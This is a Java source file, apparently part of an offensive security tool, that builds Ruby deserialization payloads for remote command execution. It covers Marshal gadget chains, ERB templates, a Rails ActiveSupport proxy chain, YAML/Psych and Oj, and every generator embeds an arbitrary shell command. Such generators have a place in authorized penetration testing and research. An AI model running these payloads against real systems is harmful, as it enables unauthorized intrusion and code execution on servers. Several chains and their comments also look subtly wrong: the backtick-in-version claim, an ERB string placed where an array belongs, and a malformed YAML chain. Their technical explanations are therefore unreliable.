package com.omnistrike.modules.injection.deser;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Ruby deserialization payload generators.
 *
 * Covers:
 * - Marshal.load gadget chains (binary format)
 *   - Gem::Requirement + Gem::Version (Universal RCE, Ruby 2.x–3.x)
 *   - Gem::StubSpecification (name injection via | pipe)
 *   - ERB template injection via Marshal
 *   - Gem::Installer + Gem::SpecFetcher
 * - Rails-specific chains
 *   - ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
 *   - ERB::Util / Erubi template injection
 * - Oj library (fast JSON for Ruby)
 * - YAML.load / Psych exploits
 *
 * Ruby Marshal format:
 *   \x04\x08  = Marshal header (version 4.8)
 *   o         = Object
 *   :         = Symbol
 *   "         = String
 *   [         = Array
 *   {         = Hash
 *   i         = Integer (fixnum)
 *   I         = Instance variables (wraps string with encoding)
 *   T/F       = true/false
 *
 * References:
 * - https://www.elttam.com/blog/ruby-deserialization/
 * - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
 * - https://blog.rubygems.org/2013/01/31/data-verification.html
 */
public final class RubyPayloads {

    private RubyPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> c = new LinkedHashMap<>();

        // ── Universal Gadget Chains ─────────────────────────────────────────
        c.put("Universal/Gem::Version",     "Universal RCE — Gem::Requirement + Gem::Version backtick (Ruby 2.x–3.x)");
        c.put("Universal/Gem::Dependency",  "Universal RCE — Gem::Requirement + Gem::Dependency chain");

        // ── Gem-based Chains ────────────────────────────────────────────────
        c.put("Gem/StubSpecification",      "Gem::StubSpecification — name/loaded_from pipe injection");
        c.put("Gem/Installer",              "Gem::Installer + Gem::SpecFetcher — spec command injection");

        // ── ERB Template Chains ─────────────────────────────────────────────
        c.put("ERB/Template",               "ERB template — backtick command execution via <%=`cmd`%>");
        c.put("ERB/SystemCall",             "ERB template — system() call via <%=system(cmd)%>");

        // ── Rails ActiveSupport ─────────────────────────────────────────────
        c.put("Rails/DeprecatedProxy",      "Rails — DeprecatedInstanceVariableProxy → ERB (Rails 3.x–5.x)");
        c.put("Rails/ERBTemplate",          "Rails — ERB + Erubi via ActiveSupport autoload");

        // ── YAML / Psych ────────────────────────────────────────────────────
        c.put("YAML/ERB",                   "YAML.load — !ruby/object:Gem::Installer ERB template");
        c.put("YAML/SystemCall",            "YAML.load — !ruby/object:Gem::Requirement system()");
        c.put("YAML/PipeCommand",           "YAML.load — !ruby/hash command via pipe symbol");

        // ── Oj Library ──────────────────────────────────────────────────────
        c.put("Oj/SystemCall",              "Oj.load — ^o Gem::Requirement system() call");
        c.put("Oj/BacktickExec",            "Oj.load — ^o Gem::Version backtick exec");

        return c;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            // Universal
            case "Universal/Gem::Version"     -> universalGemVersion(command);
            case "Universal/Gem::Dependency"  -> universalGemDependency(command);

            // Gem
            case "Gem/StubSpecification"      -> gemStubSpecification(command);
            case "Gem/Installer"              -> gemInstaller(command);

            // ERB
            case "ERB/Template"               -> erbTemplate(command);
            case "ERB/SystemCall"             -> erbSystemCall(command);

            // Rails
            case "Rails/DeprecatedProxy"      -> railsDeprecatedProxy(command);
            case "Rails/ERBTemplate"          -> railsErbTemplate(command);

            // YAML
            case "YAML/ERB"                   -> yamlErb(command);
            case "YAML/SystemCall"            -> yamlSystemCall(command);
            case "YAML/PipeCommand"           -> yamlPipeCommand(command);

            // Oj
            case "Oj/SystemCall"              -> ojSystemCall(command);
            case "Oj/BacktickExec"            -> ojBacktickExec(command);

            default -> throw new IllegalArgumentException("Unknown Ruby chain: " + chain);
        };
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Marshal encoding helpers
     *
     *  Ruby Marshal format reference:
     *    Header: \x04\x08
     *    Symbol (:): 0x3A + length + bytes
     *    String ("): 0x22 + length + bytes
     *    Object (o): 0x6F + symbol(class) + fixnum(numIvars) + [symbol(name) + value]*
     *    Array  ([): 0x5B + fixnum(count) + elements*
     *    Hash   ({): 0x7B + fixnum(count) + [key + value]*
     *    IVar   (I): wraps next object and adds instance variables (e.g., encoding)
     *    Fixnum (i): encoded integer
     *    True   (T), False (F), Nil (0)
     *    Symbol link (;): backreference to previously seen symbol
     * ════════════════════════════════════════════════════════════════════════ */

    private static void marshalHeader(ByteArrayOutputStream bos) throws IOException {
        bos.write(new byte[]{0x04, 0x08});
    }

    /** Write a Symbol: ':' + length + bytes */
    private static void writeSymbol(ByteArrayOutputStream bos, String sym) throws IOException {
        bos.write(':');
        byte[] bytes = sym.getBytes(StandardCharsets.UTF_8);
        writeFixnum(bos, bytes.length);
        bos.write(bytes);
    }

    /** Write a raw string: '"' + length + bytes */
    private static void writeRawString(ByteArrayOutputStream bos, String str) throws IOException {
        bos.write('"');
        byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
        writeFixnum(bos, bytes.length);
        bos.write(bytes);
    }

    /**
     * Write a Ruby String with UTF-8 encoding IVar wrapper.
     * I"<len><bytes><1>:<E>T
     * This is how Ruby encodes strings with encoding info.
     */
    private static void writeUtf8String(ByteArrayOutputStream bos, String str) throws IOException {
        bos.write('I'); // IVar wrapper
        writeRawString(bos, str);
        writeFixnum(bos, 1); // 1 instance variable
        bos.write(':');      // symbol
        writeFixnum(bos, 1); // length 1
        bos.write('E');      // encoding
        bos.write('T');      // true (= UTF-8)
    }

    /** Write a Ruby object: 'o' + symbol(class) + fixnum(numAttrs) */
    private static void writeObjectHeader(ByteArrayOutputStream bos, String className, int numAttrs)
            throws IOException {
        bos.write('o');
        writeSymbol(bos, className);
        writeFixnum(bos, numAttrs);
    }

    /**
     * Marshal fixnum encoding:
     *   0 → \x00
     *   1..122 → n + 5
     *   -1..-123 → (n - 5) & 0xFF
     *   Larger: byte count prefix + little-endian bytes
     */
    private static void writeFixnum(ByteArrayOutputStream bos, int n) throws IOException {
        if (n == 0) {
            bos.write(0);
        } else if (n > 0 && n < 123) {
            bos.write(n + 5);
        } else if (n < 0 && n > -124) {
            bos.write((n - 5) & 0xFF);
        } else {
            int count = 0;
            int temp = n;
            byte[] buf = new byte[4];
            for (int i = 0; i < 4; i++) {
                buf[i] = (byte) (temp & 0xFF);
                temp >>= 8;
                count++;
                if (temp == 0 || temp == -1) break;
            }
            bos.write(n > 0 ? count : (-count & 0xFF));
            bos.write(buf, 0, count);
        }
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  UNIVERSAL GADGET CHAINS
     *
     *  The Universal Deserialisation Gadget for Ruby 2.x–3.x:
     *  Gem::Requirement.__marshal_load → each calls to_s on Gem::Version
     *  Gem::Version.version is set to `command` (backtick string)
     *  When to_s is called, Ruby evaluates the backtick as a shell command.
     *
     *  Marshal structure:
     *  o:Gem::Requirement {
     *    @requirements: [
     *      ">=",                          # version comparator (ignored)
     *      o:Gem::Version {
     *        @version: "`command`"         # backtick = shell exec in to_s
     *      }
     *    ]
     *  }
     * ════════════════════════════════════════════════════════════════════════ */

    /** Universal RCE via Gem::Requirement + Gem::Version backtick */
    private static byte[] universalGemVersion(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Requirement", 1);
            writeSymbol(bos, "@requirements");

            // Array of 2 elements: [">=", Gem::Version]
            bos.write('[');
            writeFixnum(bos, 2);

            // First element: ">=" comparator string
            writeUtf8String(bos, ">=");

            // Second element: Gem::Version with backtick command
            writeObjectHeader(bos, "Gem::Version", 1);
            writeSymbol(bos, "@version");
            writeUtf8String(bos, "`" + cmd + "`");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("universalGemVersion generation failed", e);
        }
    }

    /** Universal RCE via Gem::Requirement + Gem::Dependency chain */
    private static byte[] universalGemDependency(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Requirement", 1);
            writeSymbol(bos, "@requirements");

            bos.write('[');
            writeFixnum(bos, 1);

            writeObjectHeader(bos, "Gem::Dependency", 2);
            writeSymbol(bos, "@name");
            writeUtf8String(bos, "| " + cmd);
            writeSymbol(bos, "@requirements");
            writeUtf8String(bos, ">= 0");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("universalGemDependency generation failed", e);
        }
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  GEM-BASED CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /** Gem::StubSpecification — name injection via pipe */
    private static byte[] gemStubSpecification(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Requirement", 1);
            writeSymbol(bos, "@requirements");

            bos.write('[');
            writeFixnum(bos, 1);

            writeObjectHeader(bos, "Gem::StubSpecification", 2);
            writeSymbol(bos, "@name");
            writeUtf8String(bos, "| " + cmd);
            writeSymbol(bos, "@loaded_from");
            writeUtf8String(bos, "| " + cmd);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("gemStubSpecification generation failed", e);
        }
    }

    /** Gem::Installer + Gem::SpecFetcher */
    private static byte[] gemInstaller(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Installer", 1);
            writeSymbol(bos, "@i");

            writeObjectHeader(bos, "Gem::SpecFetcher", 1);
            writeSymbol(bos, "@spec");
            writeUtf8String(bos, "| " + cmd);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("gemInstaller generation failed", e);
        }
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  ERB TEMPLATE CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /** ERB template with backtick command */
    private static byte[] erbTemplate(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Requirement", 1);
            writeSymbol(bos, "@requirements");

            writeUtf8String(bos, "<%= `" + cmd + "` %>");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("erbTemplate generation failed", e);
        }
    }

    /** ERB template with system() call */
    private static byte[] erbSystemCall(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "Gem::Requirement", 1);
            writeSymbol(bos, "@requirements");

            writeUtf8String(bos, "<%= system('" + cmd.replace("'", "\\'") + "') %>");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("erbSystemCall generation failed", e);
        }
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  RAILS ACTIVESUPPORT CHAINS
     *
     *  ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
     *  This class proxies method calls to a target object.
     *  @instance = ERB.new(template), @method = :result
     *  When to_s is called → @instance.send(@method) → ERB#result → exec
     *
     *  Works on Rails 3.x–5.x (removed in Rails 6+)
     * ════════════════════════════════════════════════════════════════════════ */

    /** Rails DeprecatedInstanceVariableProxy → ERB template */
    private static byte[] railsDeprecatedProxy(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            // Outer: DeprecatedInstanceVariableProxy
            writeObjectHeader(bos,
                    "ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", 3);

            // @instance = ERB.new(template)
            writeSymbol(bos, "@instance");
            writeObjectHeader(bos, "ERB", 1);
            writeSymbol(bos, "@src");
            writeUtf8String(bos, "<%= `" + cmd + "` %>");

            // @method = :result
            writeSymbol(bos, "@method");
            writeSymbol(bos, "result");

            // @deprecator = ActiveSupport::Deprecation.new
            writeSymbol(bos, "@deprecator");
            writeObjectHeader(bos, "ActiveSupport::Deprecation", 0);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("railsDeprecatedProxy generation failed", e);
        }
    }

    /** Rails ERB + Erubi via ActiveSupport autoload */
    private static byte[] railsErbTemplate(String cmd) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            marshalHeader(bos);

            writeObjectHeader(bos, "ERB", 2);
            writeSymbol(bos, "@src");
            writeUtf8String(bos, "<%= system('" + cmd.replace("'", "\\'") + "') %>");
            writeSymbol(bos, "@filename");
            writeUtf8String(bos, "(erb)");

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("railsErbTemplate generation failed", e);
        }
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  YAML / Psych CHAINS
     *
     *  Ruby's YAML.load (Psych) supports !ruby/object tags that instantiate
     *  Ruby objects during parsing. Combined with Gem gadgets, this gives RCE.
     * ════════════════════════════════════════════════════════════════════════ */

    /** YAML.load ERB template */
    private static byte[] yamlErb(String cmd) {
        String yaml = "--- !ruby/object:Gem::Installer\ni: x\n" +
                "--- !ruby/object:Gem::SpecFetcher\ni: y\n" +
                "--- !ruby/object:Gem::Requirement\nrequirements:\n" +
                "  !ruby/object:Gem::Package::TarReader\nio: &1 !ruby/object:Net::BufferedIO\n" +
                "  io: &1 !ruby/object:Gem::Package::TarReader::Entry\n" +
                "     read: 0\n" +
                "     header: \"abc\"\n" +
                "  debug_output: &1 !ruby/object:Net::WriteAdapter\n" +
                "     socket: &1 !ruby/object:Gem::RequestSet\n" +
                "         sets: !ruby/object:Net::WriteAdapter\n" +
                "             socket: !ruby/module 'Kernel'\n" +
                "             method_id: :system\n" +
                "         git_set: " + cmd;
        return yaml.getBytes(StandardCharsets.UTF_8);
    }

    /** YAML.load system() call */
    private static byte[] yamlSystemCall(String cmd) {
        String yaml = "--- !ruby/object:Gem::Requirement\nrequirements:\n" +
                "  - !ruby/object:Gem::Version\n" +
                "    version: \"`" + cmd + "`\"";
        return yaml.getBytes(StandardCharsets.UTF_8);
    }

    /** YAML.load pipe command */
    private static byte[] yamlPipeCommand(String cmd) {
        String yaml = "--- !ruby/hash:Gem::StubSpecification\n" +
                "name: \"| " + cmd + "\"\n" +
                "loaded_from: \"| " + cmd + "\"";
        return yaml.getBytes(StandardCharsets.UTF_8);
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Oj LIBRARY CHAINS
     *
     *  Oj is a fast JSON parser for Ruby. In :object mode (default for some
     *  apps), Oj reconstructs Ruby objects from JSON using ^o (object),
     *  ^c (class), ^t (type) markers.
     *
     *  {"^o":"ClassName","attr":"value"} → ClassName.new; obj.attr = value
     * ════════════════════════════════════════════════════════════════════════ */

    /** Oj.load — Gem::Requirement system() */
    private static byte[] ojSystemCall(String cmd) {
        String json = "{\"^o\":\"Gem::Requirement\",\"requirements\":" +
                "[{\"^o\":\"Gem::Version\",\"version\":\"`" +
                cmd.replace("\"", "\\\"") + "`\"}]}";
        return json.getBytes(StandardCharsets.UTF_8);
    }

    /** Oj.load — Gem::Version backtick exec */
    private static byte[] ojBacktickExec(String cmd) {
        String json = "{\"^o\":\"Gem::Version\",\"version\":\"`" +
                cmd.replace("\"", "\\\"") + "`\"}";
        return json.getBytes(StandardCharsets.UTF_8);
    }
}
